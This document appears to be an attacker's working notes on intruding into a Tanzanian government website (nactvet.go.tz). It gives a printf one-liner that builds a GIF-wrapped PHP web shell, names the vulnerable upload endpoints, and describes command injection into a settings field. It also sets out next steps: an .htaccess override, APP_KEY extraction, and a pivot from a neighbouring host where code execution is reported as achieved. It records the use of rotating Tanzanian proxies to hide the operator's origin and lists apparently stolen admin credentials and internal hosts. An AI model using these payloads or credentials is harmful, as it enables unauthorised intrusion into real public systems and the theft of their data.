# nactvet.go.tz — PHP Upload via GIF Header Bypass (Laravel CMS)

**Date:** 2026-06-03
**Target:** https://www.nactvet.go.tz (41.93.76.9)
**Status:** CMS Admin ✅ | RCE ❌ (Apache blocks /storage/)

## Technique: GIF Header Bypass for Laravel-FileManager .php Upload

### The Finding
Laravel-FileManager (LFM) v2.0 MIME validation was bypassed by wrapping PHP code
in a valid GIF header. Files with `.php` extension were accepted when the file
started with `GIF89a`.

### Payload
```bash
# Create valid GIF with embedded PHP
printf 'GIF89a\x10\x00\x10\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff!\xf9\x04\x01\n\x00\x01\x00,\x00\x00\x00\x00\x10\x00\x10\x00\x00\x02\x0e\x84\x8f\xa9\xcb\xed\x0f\xa3\x9c\xb4\xda\x8b\xb3>\x05\x00;\x3c\x3fphp system(\$_GET["c"]); ?\x3e' > shell.gif
```

### Upload Endpoints
| Endpoint | Type | Destination |
|----------|------|-------------|
| `/laravel-filemanager/upload?type=Images` | LFM | `/storage/public/photos/` |
| `/laravel-filemanager/upload?type=Files` | LFM | `/storage/public/files/` |
| `/insert_news` (image field) | Article Featured | `/storage/public/photos/` |
| `/upload_profile_picture` | Profile | BROKEN (500) |

### The Blocker
Apache `.htaccess` blocks ALL access to `/storage/` directory (403 Forbidden).
Even with valid session cookies and proper Referer header.

### What Worked
- LFM accepts `.php` extension when content is valid GIF
- Article creation with PHP image succeeds (SweetAlert "Article created!")
- LFM download route serves raw file content (`/laravel-filemanager/download`)
- Laravel log accessible at `/storage/logs/laravel.log` (200, but `.log` not PHP handler)

### What Failed
- Path traversal in LFM working_dir: sanitized (strip `../`)
- Null byte extension: MIME validation rejects
- Profile picture upload: HTTP 500 even on clean GIF
- Direct storage access: 403 Apache (all methods)
- Log poisoning: `.log` not configured as PHP handler

### Remaining Vectors\n1. Find writable directory OUTSIDE `/storage/`\n2. APP_KEY extraction → Laravel session deserialization\n3. Internal pivot from co-host nacte.go.tz (41.93.76.6, same /24, RCE achieved via TA shell)\n4. CVE-2021-3129 Ignition RCE (execute-solution route exists, returns 405 on GET)\n\n### New Findings (2026-06-03 Session 2)\n\n**Web-Setup Command Injection (HTTP 500):**\nThe `modify_web_setting_configuration` endpoint calls Laravel artisan commands\n(config:clear, config:cache) using form field values. Injecting shell metacharacters\n(`;`, `` ` ``, `$()`) into the `web_name_en` field triggers HTTP 500 — the server\ncrashes executing the injection. No output returned but side effects possible.\nTry: `php artisan storage:link` to create `/public/storage` symlink.\n\n**.htaccess Already Exists (Finding, Not Blocker):**\nLFM upload of `.htaccess` returns `\"A file with this name already exists!\"` —\nconfirming Apache rules ARE present in the upload directory. Strategy:\n1. Download existing `.htaccess` via LFM download route\n2. Analyze blocking rules\n3. Create subdirectory via LFM `working_dir=/rce`\n4. Upload PHP + custom `.htaccess` to subdirectory\n\n**9proxy TZ Rotating Proxy (FIXED):**\n9proxy TZ sticky sessions were using a fake stub SSID (`TZses01abc`). Rotating\nmode with `country-TZ` (no SSID) gives REAL Tanzanian IPs (MIC Tanzania, Airtel TZ).\nOther `.go.tz` sites confirmed reachable. See `references/proxy-tz-debugging.md`\nin hephaestus-framework for details.\n\n**CKEditor Feature Attack Surface:**\nSee `references/cms-authenticated-rce.md` for full matrix of CKEditor features\ntested and their results. Key gaps: Image URL SSRF, IFrame embed, Media embed\nstill untested.

### CMS Details
- Custom Laravel CMS with CKEditor 4 + Laravel-FileManager v2.0
- Webroot: `/var/www/html/`
- CMS admin: `kihwele@nacte.go.tz:KihweleHacked2026!`
- Failed creds: `teamcookapple@gmail.com:SuperAdmin2026!`
- Same /24: nacte (.6), nactvet (.9), tvetims (.12), MySQL (.13), cse (.16)
